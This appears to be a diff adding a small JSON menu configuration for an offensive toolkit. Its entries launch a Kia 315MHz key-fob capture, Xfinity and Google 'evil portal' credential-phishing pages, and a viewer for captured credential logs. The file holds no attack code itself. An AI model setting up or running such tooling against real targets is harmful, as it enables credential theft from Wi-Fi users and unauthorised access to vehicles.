@@ -1,0 +1,6 @@
+[
+  { "label": "KIA 315MHz CAPTURE", "action": "run_script", "path": "/DarkLugia/scripts/kia_auto.js" },
+  { "label": "XFINITY EVIL PORTAL", "action": "run_script", "path": "/DarkLugia/scripts/xfinity_auto.js" },
+  { "label": "GOOGLE EVIL PORTAL", "action": "run_script", "path": "/DarkLugia/scripts/google_auto.js" },
+  { "label": "CREDENTIAL LOGS", "action": "run_script", "path": "/DarkLugia/scripts/logs_viewer.js" }
+]
